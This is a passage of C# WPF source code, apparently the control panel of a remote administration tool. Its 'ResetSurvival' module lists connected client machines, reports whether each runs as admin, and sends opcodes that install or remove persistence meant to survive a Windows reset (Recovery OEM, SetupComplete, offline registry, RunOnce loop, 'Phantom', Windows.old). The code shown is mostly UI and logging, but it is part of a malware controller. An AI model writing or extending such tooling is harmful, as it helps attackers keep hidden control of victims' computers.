                var r = GetOrAdd(id); r.IsReady = true; r.State = "Ready"; AppendLog($"{Short(id)} ready");
            });
        }

        public void OnCommandAck(string id, byte op)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var r = GetOrAdd(id); r.LastResult = $"? {OpName(op)}"; AppendLog($"{Short(id)}: {OpName(op)} OK");
            });
        }

        public void OnCommandError(string id, byte op, string err)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var r = GetOrAdd(id); r.LastResult = $"? {OpName(op)}: {err}"; AppendLog($"{Short(id)}: {OpName(op)} FAILED - {err}");
            });
        }

        public void OnInfoReceived(string id, string info)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var r = GetOrAdd(id); r.LastResult = "Info received";
                foreach (var line in info.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
                    if (line.StartsWith("IsAdmin=")) r.State = line.Contains("True") ? "Ready (Admin)" : "Ready (User)";
                AppendLog($"{Short(id)}: Info received");
            });
        }

        public void OnStatusReceived(string id, string status)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var r = GetOrAdd(id);
                foreach (var line in status.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
                {
                    int eq = line.IndexOf('='); if (eq < 0) continue;
                    string k = line.Substring(0, eq).Trim();
                    string v = line.Substring(eq + 1).Trim();
                    string d = v.StartsWith("YES") ? "✓" : "✗";
                    switch (k)
                    {
                        case "RecoveryOEM": r.OEM = d; break;
                        case "SetupComplete": r.SetupComplete = d; break;
                        case "OfflineReg": r.OfflineReg = d; break;
                        case "RunOnceLoop": r.RunOnce = d; break;
                        case "Phantom": r.Phantom = d; break;
                        case "WindowsOld": r.WindowsOld = d; break;
                    }
                }
                r.LastResult = "Status updated"; AppendLog($"{Short(id)}: Status updated");
            });
        }

        private ResetSurvivalClientRow GetOrAdd(string id)
        {
            var r = _clients.FirstOrDefault(c => c.ClientId == id);
            if (r == null) { r = new ResetSurvivalClientRow(id) { IsSelected = true }; _clients.Add(r); UpdateCount(); }
            return r;
        }

        private void UpdateCount() => _clientCountLabel.Text = $"{_clients.Count(c => c.IsReady)} ready / {_clients.Count} clients";

        private void AppendLog(string m)
        {
            Dispatcher.BeginInvoke(() =>
            {
                string ts = DateTime.Now.ToString("HH:mm:ss");
                _logTextBox.AppendText($"[{ts}] {m}\n");
                if (_logTextBox.Text.Length > 8000)
                {
                    int cut = _logTextBox.Text.Length - 6000;
                    int nl = _logTextBox.Text.IndexOf('\n', cut);
                    if (nl >= 0 && nl < _logTextBox.Text.Length - 1) cut = nl + 1;
                    _logTextBox.Select(0, cut); _logTextBox.SelectedText = "";
                    _logTextBox.Select(_logTextBox.Text.Length, 0);
                }
                _logTextBox.ScrollToEnd();
            });
        }

        private static string Short(string id) => id.Length > 12 ? id.Substring(0, 12) + "..." : id;
        private static string OpName(byte op) => op switch
        {
            0x01 => "Query Info", 0x02 => "Install OEM", 0x03 => "Install SetupComplete",
            0x04 => "Install Offline Reg", 0x05 => "Install RunOnce Loop", 0x06 => "Install Phantom",
            0x07 => "Install WinOld", 0x10 => "Remove OEM", 0x11 => "Remove SetupComplete",
            0x12 => "Remove Offline Reg", 0x13 => "Remove RunOnce Loop", 0x14 => "Remove Phantom",
            0x15 => "Remove WinOld", 0x20 => "Query Status", _ => $"0x{op:X2}"
        };
        private static GridViewColumn MkCol(string h, string b, double w, bool cb = false)
        {
            var c = new GridViewColumn { Header = h, Width = w };
            if (cb)
            {
                var f = new FrameworkElementFactory(typeof(CheckBox));
                f.SetBinding(ToggleButton.IsCheckedProperty, new System.Windows.Data.Binding(b) { Mode = System.Windows.Data.BindingMode.TwoWay });
                c.CellTemplate = new DataTemplate { VisualTree = f };
            }
            else c.DisplayMemberBinding = new System.Windows.Data.Binding(b);
            return c;
        }

        private Border Sep() => new Border { Height = 1, Background = new SolidColorBrush(C("BorderColor")), Margin = new Thickness(0, 6, 0, 6) };
        private TextBlock Hdr(string t) => new TextBlock { Text = t, FontSize = 13, FontWeight = FontWeights.SemiBold, Foreground = new SolidColorBrush(C("TextSecondaryColor")), Margin = new Thickness(0, 4, 0, 4) };
        private StackPanel SelRow()
        {
            var r = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(0, 0, 0, 8) };
            var b = MakeBtn("Select All", ButtonBgClr, ButtonBgHoverClr);
            b.Click += (s, e) =>
            {
                _selectAllState = !_selectAllState;
                foreach (var c in _clients) c.IsSelected = _selectAllState;
                ((Button)s).Content = _selectAllState ? "Select None" : "Select All";
            };
            r.Children.Add(b);
            return r;
        }

        private Button MakeBtn(string t, Color n, Color h)
        {
            var nb = new SolidColorBrush(n); var hb = new SolidColorBrush(h);
            var bb = new SolidColorBrush(C("ButtonBorderColor")); var db = new SolidColorBrush(C("ButtonBgColor"));
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1)); bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4)); bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var hv = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; hv.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(hv);
            var pr = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true }; pr.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); pr.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(pr);
            var ds = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; ds.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); ds.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tp.Triggers.Add(ds);
            return new Button { Content = t, Template = tp, Foreground = new SolidColorBrush(C("TextPrimaryColor")), Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        public void Dispose() { }
    }
}
